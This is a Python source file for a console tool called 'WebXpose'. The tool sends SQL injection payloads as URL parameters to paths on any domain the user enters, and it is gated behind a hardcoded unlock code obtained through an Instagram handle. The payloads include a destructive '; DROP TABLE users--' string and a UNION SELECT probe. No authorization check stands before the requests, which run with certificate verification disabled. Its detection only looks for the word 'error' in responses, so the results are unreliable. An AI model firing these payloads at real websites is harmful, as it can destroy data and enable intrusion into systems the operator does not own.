import requests
import time
from colorama import Fore, Back, Style, init
import pyfiglet
from urllib.parse import urljoin

# Initialize colorama for colorful console output
init(autoreset=True)

# Constants
UNLOCK_CODE = "hatelove"
is_locked = True

# Function: Generate Logo
def generate_logo():
    return pyfiglet.figlet_format("WebXpose", font="slant")

# Function: Typewriter Effect
def type_writer_effect(message, speed=0.05, color=Fore.WHITE):
    for char in message:
        print(color + char, end="", flush=True)
        time.sleep(speed)
    print()

# Function: Unlock Mechanism
def check_unlock():
    """Unlock the tool by verifying the unlock code."""
    global is_locked
    type_writer_effect("\nEnter the unlock code to proceed: ", speed=0.02, color=Fore.YELLOW)
    code = input(Fore.YELLOW + ">>> ").strip()
    if code == UNLOCK_CODE:
        is_locked = False
        type_writer_effect("Tool unlocked. Welcome!", speed=0.02, color=Fore.GREEN)
    else:
        type_writer_effect("Incorrect unlock code. Exiting tool.", speed=0.02, color=Fore.RED)
        exit()

# Function: Advanced SQL Injection Scan
def advanced_sql_injection_scan(domain):
    """Perform an advanced SQL injection scan on the given domain."""
    type_writer_effect(f"\nPerforming Advanced SQL Injection Scan on {domain}", speed=0.02, color=Fore.CYAN)
    base_url = f"http://{domain}"
    payloads = ["' OR '1'='1", "'; DROP TABLE users--", "' UNION SELECT 1,2,3--"]
    try:
        test_urls = input(Fore.YELLOW + "Enter test URLs separated by commas (e.g., /login,/search): ").split(',')
        for url in test_urls:
            full_url = urljoin(base_url, url.strip())
            for payload in payloads:
                try:
                    response = requests.get(full_url, params={'id': payload}, timeout=5, verify=False)
                    if "error" in response.text.lower():
                        print(Fore.GREEN + f"Potential SQL Injection detected at {full_url} with payload: {payload}")
                except requests.exceptions.RequestException as e:
                    print(Fore.RED + f"Error testing {full_url}: {e}")
    except Exception as e:
        print(Fore.RED + f"Error during SQL Injection scan: {e}")

# Function: Menu
def menu():
    """Display the menu and handle user input."""
    while True:
        print(Fore.CYAN + "="*50)
        print(generate_logo())
        print(Fore.CYAN + "="*50)
        type_writer_effect("\nMENU OPTIONS:", speed=0.02, color=Fore.MAGENTA)
        print(Fore.GREEN + '''
 [0]  Basic Recon
 [14] Advanced SQL Injection Scan
 [Q]  Quit
        ''')
        choice = input(Fore.YELLOW + "Enter your choice: ").strip().upper()  # Normalize input

        if choice == 'Q':
            type_writer_effect("Exiting tool...", speed=0.02, color=Fore.RED)
            break
        elif choice == '14':
            domain = input(Fore.YELLOW + "Enter the domain (e.g., example.com): ").strip()
            if domain:
                advanced_sql_injection_scan(domain)
            else:
                type_writer_effect("Invalid domain. Please try again.", speed=0.02, color=Fore.RED)
        elif choice == '0':
            type_writer_effect("Basic Recon is not implemented yet!", speed=0.02, color=Fore.YELLOW)
        else:
            type_writer_effect("Invalid choice. Please try again.", speed=0.02, color=Fore.RED)

# Main Execution
if __name__ == "__main__":
    print(Fore.CYAN + Back.BLACK + " " * 20 + "WebXpose" + " " * 20)
    print(Fore.CYAN + Back.BLACK + "="*50)
    print(generate_logo())
    print(Fore.CYAN + Back.BLACK + "="*50)

    type_writer_effect("Created by Maria", speed=0.02, color=Fore.YELLOW)
    type_writer_effect("Contact Insta: cyberphantomsyndicate for unlock code", speed=0.02, color=Fore.YELLOW)

    # Unlock Check
    check_unlock()

    # Run Menu
    if not is_locked:
        menu()
